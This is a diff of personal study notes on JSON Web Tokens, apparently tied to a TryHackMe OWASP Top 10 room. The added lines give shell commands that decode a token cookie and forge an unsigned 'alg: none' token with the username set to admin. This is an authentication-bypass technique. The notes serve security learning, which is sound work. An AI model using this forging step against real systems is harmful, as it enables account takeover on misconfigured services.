@@ -7,8 +7,9 @@ Common Terms | Description/Human Readable
 `nbf <epoch>` |Not before
 `exp` | expires
 
-JSON Web Tokens [https://jwt.io/](https://jwt.io/)
+It vulnerable is misconfigured as Data Integrity Failure - see [[OWASP-Top-10-Historic-Definitions]] 
 
+JSON Web Tokens [https://jwt.io/](https://jwt.io/). These are JSON base64 encoded  chunks delimited by dots. 
 ```json
 {
 	// Header
@@ -22,6 +23,31 @@ JSON Web Tokens [https://jwt.io/](https://jwt.io/)
 	"exp":"1234567890"
 }
 
-signature = 
+// signature is the signing algorithm used in "alg":
+...
 
+// go from 
+{HEADER}.{PAYLOAD}.SIGNATURE
+// To - do not forget the final dot if you set the signing algorithm to none parser will still expect the .
+{HEADER}.{PAYLOAD}.
 ```
+
+Workflow
+```bash
+# copy into a file
+cat cookie | awk -F. '{print $1}' | base64 -d
+cat cookie | awk -F. '{print $2}' | base64 -d
+
+# Then given the fields of the json 
+# beware of escaping the quotations in Json 
+echo "{\"typ\":\"JWT\",\"alg\":\"none\"}" | base64 | tr -d '=' && echo "{\"username\":\"admin\",\"exp\":1687860563}" | base64 | tr -d '='
+
+# Piece together with two dots
+$1.$2.
+```
+
+
+## Reference
+
+[https://jwt.io/](https://jwt.io/)
+[THM OWASP TOP 10 2021 Room](https://tryhackme.com/room/owasptop102021)
